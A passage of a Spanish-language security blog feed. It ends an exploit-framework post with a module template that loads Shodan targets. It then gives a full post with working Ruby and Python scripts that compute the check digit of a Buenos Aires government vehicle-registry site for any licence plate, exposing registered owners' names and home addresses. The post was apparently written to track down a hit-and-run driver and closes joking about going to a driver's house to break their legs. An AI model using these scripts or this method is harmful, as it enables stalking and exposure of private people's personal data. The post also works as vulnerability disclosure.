href="http://2.bp.blogspot.com/-HcbKH6dgzWA/VNZ1yQ5FxFI/AAAAAAAAAXk/Uw_DDHL1O9s/s1600/attack.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-HcbKH6dgzWA/VNZ1yQ5FxFI/AAAAAAAAAXk/Uw_DDHL1O9s/s1600/attack.png" height="422" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"></div><br /><div style="text-align: center;"><b>BOOM! explotado con exito el rce!</b></div><br />Cabe resaltar para terminar, que en el directorio&nbsp;<b> /FrameShock/ExampleModule</b> contamos con un modulo de ejemplo para comenzar a programar desde ahí.<br /><br /><br /><pre class="brush: py"># -*- coding: utf-8 -*-<br />import sys<br />sys.path.append('.')<br />from config import config<br />from tabulate import tabulate<br /><br />class module(config):<br /><br /><br />####Init configuration####<br />    def __init__(self):<br />        self.config = config()<br />        self.cur = self.config.getCursor()<br />        self.con = self.config.getCon()<br />        self.targets=[]<br />        self.preExecution()<br />##########################<br /><br />####User define information####<br />    def preExecution(self):<br />        while(True):<br />            option = raw_input("&gt; ")<br />            if(option=="exit"):<br />                exit(0)<br /><br />            if(option=="help"):<br /><br />                print("set target URL:PORT --&gt; Manual Target")<br />                print("clear targets       --&gt; Show Targets in module")<br />                print("show targets        --&gt; Clear Targets in module")<br />                print("use shodan          --&gt; Targets from Shodan Results")<br />                print("exploit             --&gt; Start atack")<br />                print("exit                --&gt; Close Module")<br /><br />            if(option.find("set target")&gt;-1):<br />                data = option.split(" ")<br />                data = data[2].split(":");<br />                target = data[0]<br />                port = data[1]<br />                self.targets.append((0,target,port,"Manual","null"))<br /><br />            if(option.find("use shodan")&gt;-1):<br />                self.targets=self.config.getTargets();<br /><br />            if(option=="clear targets"):<br />                self.targets=[]<br />                print("Clear Done")<br /><br />            if(option=="show targets"):<br />                if(len(self.targets)!=0):<br />                        print tabulate(self.targets, ["id", "IP", "PORT", "Description", "Vulnerable Module"], tablefmt="grid")<br />                else:<br />                    print "No targets"<br /><br />            if(option=="exploit"):<br />                self.exploit()<br />###################################<br /><br />###Exploit c0de###<br />    def exploit(self):<br />        if(len(self.targets)!=0):<br />            for target in self.targets:<br />                ###YOUR EXPLOIT CODE HERE###<br />                print "Atack "+target[1]+":"+target[2]<br />        else:<br />            print "No targets found";<br /><br />####def custom user functions (calleable from exploit())####<br />    def testFunctions(self):<br />        print "Atack test"<br />#############################################################<br /><br />#####Init Module#####<br />start = module()<br />#####################<br /></pre><br />Saludos! y Happy Frameshock Hacking!]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[¿Quién te choco? Hackeando Patentes ]]></title>
    <link href="http://securitysignal.github.io/blog/2015/02/05/quien-te-choco-hackeado-patentes/"/>
    <updated>2015-02-05T19:19:00-08:00</updated>
    <id>http://securitysignal.github.io/blog/2015/02/05/quien-te-choco-hackeado-patentes</id>
    <content type="html"><![CDATA[<div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-Kaj4GWRPSTo/VNQZifsmy3I/AAAAAAAAAT8/PolYUA2eVOU/s1600/test.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-Kaj4GWRPSTo/VNQZifsmy3I/AAAAAAAAAT8/PolYUA2eVOU/s1600/test.png" height="380" width="640" /></a></div><div style="text-align: right;"><b>by hdbreaker</b></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Hace algún tiempo tuve la mala fortuna de estar envuelto en un accidente de trafico algo grave, donde yo por viajar en moto, me lleve la peor parte. Totalmente en contra a lo que esperaba, el responsable del accidente no se detuvo a asistirme, por su parte prefirió darse a la fuga.<br /><br />Luego de todos los protocolos médicos, unos cuantos moretones y tras no encontrar respuestas en la policía por falta de testigos, decidí comenzar una búsqueda personal de identificación del vehículo con el único dato que había logrado divisar en el golpe. </div><div style="text-align: center;"><span style="color: red;"><b>###su numero de patente###</b></span></div><div style="text-align: center;"></div><div style="text-align: left;"><span style="color: red;"></span>Por cuestiones de confidencialidad no utilizare la patente real del agresor sino una que alcance a leer en el registro del automotor mientras realizaba los tramites del seguro.</div><div style="text-align: left;"></div><div style="text-align: center;"><h2><u><b>¿La pregunta? </b></u></h2></div><div style="text-align: left;">Existe algún sistema que me permita consultar los datos y el estado de un vehículo que transita en la calle actualmente? La respuesta es si!</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Luego de algunas consultas a google, logre dar con un servicio de Rentas en la provincia de Buenos Aires que nos permite consultar el estado de deudas de patentes que tiene un vehículo.<br /><a href="https://www.blogger.com/goog_1561451275"><br /></a></div><div style="text-align: center;"><a href="https://lbserver02.agip.gob.ar/ConsultaPat/index.html">https://lbserver02.agip.gob.ar/ConsultaPat/index.html</a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">El mismo tiene dos formas de funcionar, si no eres el propietario solamente puedes obtener los datos correspondiente a deudas sobre el automóvil pero el sistema no te permite acceder a las secciones que identifica a la persona registrada en el Registro del Automotor como titular del vehículo.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Por otro lado, para comprobar la titularidad del vehículo, el sistema solicita ingresar un numero de verificación especial <b>único</b> que solo el dueño del automóvil debe poseer, ya que el mismo sirve para imprimir boletas de pago de deudas que incluyen los datos personales del propietario del automotor, de esta forma garantiza la privacidad de los datos de los usuarios.</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-qB9xNkqbtHs/VNQfJe_tVKI/AAAAAAAAAUM/70QsGT-fpeQ/s1600/num.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-qB9xNkqbtHs/VNQfJe_tVKI/AAAAAAAAAUM/70QsGT-fpeQ/s1600/num.png" height="366" width="640" /></a></div><div style="text-align: center;"></div><div style="text-align: left;">Lo primero que podemos analizar en el sitio, es que el dígito especial y verificador del sistema, solo acepta valores que van desde 00 a 99 (el valor no es tan único como uno cree)</div><div style="text-align: left;"><br /></div><div style="text-align: left;">En fin, la patente a estudiar en esta entrada sera <b>JMO089</b>, luego de realizar algunas pruebas manuales podemos apreciar que el captcha del sistema nunca es actualizado una vez que nos encontramos asociado a una sesión, permitiéndonos probar de forma manual las 99 combinaciones posibles hasta dar con la correcta.</div><div style="text-align: left;"></div><div style="text-align: left;"><br /></div><div style="text-align: center;"><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-lCSRLVEmFNI/VNQhXub3esI/AAAAAAAAAUY/I81TL06CM9Y/s1600/Sin%2Bnombre.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-lCSRLVEmFNI/VNQhXub3esI/AAAAAAAAAUY/I81TL06CM9Y/s1600/Sin%2Bnombre.png" height="224" width="640" /></a></div><br /></div><div style="text-align: left;">En la imagen podemos apreciar que el captcha no cambia a medida que vamos probando posibles combinaciones numéricas hasta lograr dar con el correcto, por lo que da la posibilidad de programar un Brute Forcer que valla probando todos los valores posibles hasta dar con el indicado. Pero un ataque así representa un problema al tener que enfrentarnos con un captcha, cosa que no estaba dispuesto por una falta de tiempo para programar un <a href="http://webscraping.com/blog/Solving-CAPTCHA/"><b>OCR</b></a>.<br /><br />La pregunta que me formule fue:<br /><br /><b>Cual es la forma en que el sistema valida el valor correcto del dígito verificador?</b><br /><br />Lo primero que pensé es que el sistema validaba el valor del lado del servidor luego de la consulta, por lo que me puse a comprobar las peticiones que realizaba el sitio al momento de enviar el formulario. Para esto utilice <b>Live HTTP headers</b><br /><b><br /></b><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-wi2c_1oB0sk/VNQkcg_JOZI/AAAAAAAAAUk/qz6SK1EJIA8/s1600/ajax.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-wi2c_1oB0sk/VNQkcg_JOZI/AAAAAAAAAUk/qz6SK1EJIA8/s1600/ajax.png" height="355" width="640" /></a></div><div style="text-align: center;"><b><br /></b></div><div style="text-align: left;">Al encontrarme con esto, no podía creer lo que estaba viendo, técnicamente hablando si una validación no presenta una petición web hacia el Backend, quiere decir que la validación se esta realizado del lado del cliente osea:</div><div style="text-align: center;"><h2><b>EL SISTEMA VALIDA POR JAVASCRIPT!</b><b>&nbsp;</b><b> </b></h2></div><div style="text-align: left;">Esto implica que el algoritmo de validación del código verificador se encuentra servido en algún archivo <b>javascript</b> del lado del navegador, por lo que me puse a analizar el source html del documento para lograr identificar algún indicio de la validación. Lo primero que analice fueron los siguientes archivos:</div><div style="text-align: left;"><br /></div><div style="text-align: left;"></div><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-KjLsz9ou-FM/VNQmEVvOV2I/AAAAAAAAAUw/2AguNFy0xFk/s1600/ttt.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-KjLsz9ou-FM/VNQmEVvOV2I/AAAAAAAAAUw/2AguNFy0xFk/s1600/ttt.png" height="38" width="640" /></a></div><div style="text-align: center;"><br /><div style="text-align: left;">Dentro del archivo <b>consultaDatos.js</b> encontré la siguiente función con un nombre revelador: <b>validaDatos</b></div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-mK0b28HlMos/VNQmv5XUaQI/AAAAAAAAAU4/BX-qrWpYwEA/s1600/validator.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-mK0b28HlMos/VNQmv5XUaQI/AAAAAAAAAU4/BX-qrWpYwEA/s1600/validator.png" height="496" width="640" /></a></div><div style="text-align: left;"><div style="text-align: center;"><pre><span style="color: red;"><b>&nbsp;</b></span></pre><pre><span style="color: red;"><b>if (!check.checked &amp;&amp; patente.valido(dom1) != true)</b></span></pre></div>En la misma función se puede apreciar&nbsp; en las lineas remarcadas la estructura donde se decide el mensaje de patente valida cumpliendo los requisitos de que el <b>checkbox</b> se encuentre marcado y el resultado de la función <span style="color: red;"><b>patente.valido()</b></span> sea el necesario para resolver de forma correcta la estructura de decisión <span style="color: red;"><b>if</b><b>()</b></span>.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">El problema resulto que la función <b>patente.valido() </b>no se encontraba dentro del mismo documento, por lo que debía encontrar el fichero donde se encontraba la misma. <br /><br />Para lo que no conozcan el funcionamiento de javascript, les aclaro que los ficheros js representan un gran código estructurado dividido en distintos archivos para mejorar su organización, pero siempre que estos archivos sean incluidos en el html los mismos pueden realizar llamadas a las funciones definidas entre ellos como si todos fueran miembros de la misma clase.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Luego de buscar un poco, llegue al siguiente archivo:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-VzGAp_0Rm0M/VNQpOUC5f2I/AAAAAAAAAVE/uBs_0swkoFA/s1600/pat.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-VzGAp_0Rm0M/VNQpOUC5f2I/AAAAAAAAAVE/uBs_0swkoFA/s1600/pat.png" height="22" width="640" /></a></div><div style="text-align: center;"><br /></div></div><div style="text-align: left;">Dentro del mismo podemos obtener la estructura del código validador:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-h0CKawpkx_Q/VNQpyo9SWII/AAAAAAAAAVM/yqNczRJ7AZI/s1600/getdv.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-h0CKawpkx_Q/VNQpyo9SWII/AAAAAAAAAVM/yqNczRJ7AZI/s1600/getdv.png" height="628" width="640" /></a></div><div style="text-align: center;"><br /></div></div></div><div style="text-align: right;">Función Completa: <a href="http://pastebin.com/gYTdC9Yh">http://pastebin.com/gYTdC9Yh</a></div><div style="text-align: left;"><br />Luego de analizar detenida mente el código pude develar el comportamiento final del mismo.<br /><br />El código calcula el dígito verificador en base a la patente del vehículo, sustituyendo las letras por números especiales para formar una cadena decimal, que luego suma según su indice, pares por un lado e impares por otro, como si de un array se tratase.</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-Ie58vHIagQY/VNQrEziWUUI/AAAAAAAAAVY/pX2M3Zc9uOw/s1600/tetete.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-Ie58vHIagQY/VNQrEziWUUI/AAAAAAAAAVY/pX2M3Zc9uOw/s1600/tetete.png" height="508" width="640" /></a></div><div style="text-align: left;"><br />Luego si estos valores separados (digi1 y digi2) tienen un largo superior a un dígito (0 a 9), vuelve a sumarlos respectivamente hasta obtener 2 números de forma independiente con un largo de un dígito (0 a 9).</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Y luego los concatena para obtener el numero mágico verificador:</div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-B7iqpLnp82I/VNQr4qxNCXI/AAAAAAAAAVg/5uRIZdU7AfM/s1600/salida.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-B7iqpLnp82I/VNQr4qxNCXI/AAAAAAAAAVg/5uRIZdU7AfM/s1600/salida.png" height="38" width="320" /></a></div><div style="text-align: left;">Lo que resulta algo cómico es que esta función no tiene ninguna protección, y puede ser llamada desde la consola de desarrollo de Google Chrome o Firefox:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-ImRsGXuhKfc/VNQseJUbl1I/AAAAAAAAAVo/WpdGiwnySNE/s1600/call.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-ImRsGXuhKfc/VNQseJUbl1I/AAAAAAAAAVo/WpdGiwnySNE/s1600/call.png" height="192" width="640" /></a></div><div style="text-align: left;">Con este numero verificador podemos realizar la consulta de forma exitosa:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-rnPrnoDRUjk/VNQtCQ-CziI/AAAAAAAAAVw/9sXsescIvw8/s1600/principal.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-rnPrnoDRUjk/VNQtCQ-CziI/AAAAAAAAAVw/9sXsescIvw8/s1600/principal.png" height="180" width="640" /></a></div><div style="text-align: center;"><br /></div></div></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Al momento de solicitar una factura podemos apreciar los datos personales como el nombre del titular registrado y la dirección residencial del mismo:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-Sm6PzSW1M8U/VNQtS3TmFjI/AAAAAAAAAV4/aQ6q8AI22ok/s1600/datos.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-Sm6PzSW1M8U/VNQtS3TmFjI/AAAAAAAAAV4/aQ6q8AI22ok/s1600/datos.png" height="368" width="640" /></a></div><div style="text-align: center;"><br /></div>Realizando un poco de ingienería inversa desarrolle el siguientes scripts que permiten calcular cualquier dígito verificador solo con el numero de patente:<br /><br /><b>Ruby:</b><br /><b><br /></b><br /><pre class="brush: ruby">require 'colorize' #By hdbreaker<br /><br />class Calculate <br /><br />  def initialize()<br />   <br />    #inicializo array asociativo de clase<br />    @letrasValidas ={'A' =&gt; '14','B' =&gt; '01','C' =&gt; '00','D' =&gt; '16','E' =&gt; '05','F' =&gt; '20','G' =&gt; '19',<br />                     'H' =&gt; '09','I' =&gt; '24','J' =&gt; '07','K' =&gt; '21','L' =&gt; '08','M' =&gt; '04','N' =&gt; '13',<br />                     'O' =&gt; '25','P' =&gt; '22','Q' =&gt; '18','R' =&gt; '10','S' =&gt; '02','T' =&gt; '06','U' =&gt; '12',<br />                     'V' =&gt; '23','W' =&gt; '11','X' =&gt; '03','Y' =&gt; '15','Z' =&gt; '17',' ' =&gt; '60',};<br />  end<br /><br />  #Funcion para calcular el numero de patente<br />  def calculate(patente)<br />    patAux = patente.upcase;<br />    pares = 0;<br />    impares = 0;<br /><br />    #Bloque para sustituir las letras por los numeros correspondisntes<br />    @letrasValidas.each { |key|<br />      if(patAux.include? key[0])<br />        patAux = patAux.gsub(key[0], key[1]);<br />      end<br />    }<br /><br />    #Sumo los imares por un lado y los pares por el otro<br />    for x in (0...patAux.length)<br />      if (x % 2 == 0)<br />        pares += patAux[x].to_i;<br />      else<br />        impares += patAux[x].to_i;<br />      end<br />    end<br /><br />    #Si la sumatoria de los pares da un numero mayor a 1 digito, los sumo nuevamente hasta obtener 1 digito<br />    digi1 =pares.to_s;<br />    while (digi1.length &gt; 1)<br />      pares = 0;<br />      for x in (0...digi1.length)<br />        pares += digi1[x].to_i;<br />      end<br />      digi1 = pares.to_s;<br />    end<br /><br />    #Si la sumatoria de los impares da un numero mayor a 1 digito, los sumo nuevamente hasta obtener 1 digito<br />    digi2 =impares.to_s;<br />    while (digi2.length &gt; 1)<br />      impares = 0;<br />      for x in (0...digi2.length)<br />        impares += digi2[x].to_i;<br />      end<br />      digi2 = impares.to_s;<br />    end<br /><br />    ###############Salida en Pantalla###############<br />    puts "\n############## Rentas Ciudad de Buenos Aires ##############".green<br />    puts "URL: ".green+"https://lbserver02.agip.gob.ar/ConsultaPat/index.html".red<br />    puts "Dominio: ".green+patente.red<br />    puts "Verificador: ".green+digi1.red+""+digi2.red<br />    puts "\n"<br />  end<br />end<br /><br />if(ARGV.length==1)<br />  obj = Calculate.new()<br />  obj.calculate(ARGV[0].to_s)<br />else<br />  puts "Usage: ruby calculate.rb [patente]"<br />end<br /><br /><br /></pre><br />También dejo a continuación el script en python que armo <b>[Q]3rV[0]</b><br/><pre class="brush: py"><br />#!/usr/bin/env python<br /># -*- coding: utf-8 -*-<br /># Author : [Q]3rV[0]<br /><br />import re<br /><br />def main():<br />    pares=0<br />    impares=0<br />    letrasPatente={"A":"14", "B":"01", "C":"00", "D":"16", "E":"05", "F":"20", "G":"19", "H":"09", "I":"24", "J":"07", "K":"21", "L":"08", "M":"04", "N":"13", "O":"25", "P":"22", "Q":"18", "R":"10", "S":"02", "T":"06", "U":"12", "V":"23", "W":"11", "X":"03", "Y":"15", "Z":"17", " ":"60"}<br />    input=raw_input("Nro Patente: ")<br />    patente=input.upper()<br />    if re.match("[A-Z][A-Z][A-Z][0-9][0-9][0-9]$", patente)!=None:<br />        toInt=""<br />        for n in patente[0:3]:<br />            toInt+=letrasPatente[n]<br />        nums=toInt+patente[3:] <br />        <br />        for n in range(len(nums)):<br />            if n%2==0:<br />                pares+=int(nums[n])<br />            else:<br />                impares+=int(nums[n])<br /><br /><br />        while len(str(pares))!=1:<br />           dp=0<br />           for p in str(pares):<br />               dp+=int(p)<br />           pares=dp<br />          <br /><br />        while len(str(impares))!=1:<br />           di=0<br />           for i in str(impares):<br />               di+=int(i)<br />           impares=di<br />     <br /><br />        <br />        print "| Patente: %s | DV: %s%s |" % (patente, pares, impares)<br /><br />    else:<br />        print "[*] Error, Asegurese de que el formato de la patente es correcto. Ejemplo: GTD125"<br />       <br />if __name__ == '__main__':<br />    main()<br /><br /></pre><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-qYYlvHTBrt4/VNQx_GXRnNI/AAAAAAAAAWE/MbP8fPDnWQ0/s1600/jmo.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-qYYlvHTBrt4/VNQx_GXRnNI/AAAAAAAAAWE/MbP8fPDnWQ0/s1600/jmo.png" height="114" width="640" /></a></div><div style="text-align: center;"><br /></div>Espero que esta entrega sirva para concientizar sobre la seguridad de nuestros datos personales, ya que recordemos que el fallo se encuentra en una red gubernamental que expone de forma descarada los datos personales de las personas. <br /><br />Y si eres conductor... no vallas por la calle creyéndote intocable, nunca sabes con quien te puedes cruzar ni para que pueda utilizar tus datos, tal vez te encuentres con una persona que en vez de reportar el fallo utilice tu información para encontrarte, ir hacia tu casa y romperte las piernas.<br /><div style="text-align: right;"><br /><b>Saludos!</b></div><br /><br /><b><br /></b>&nbsp; <br /><br /><br /></div><div style="text-align: left;"><br /></div>]]></content>
  </entry>
  
</feed>
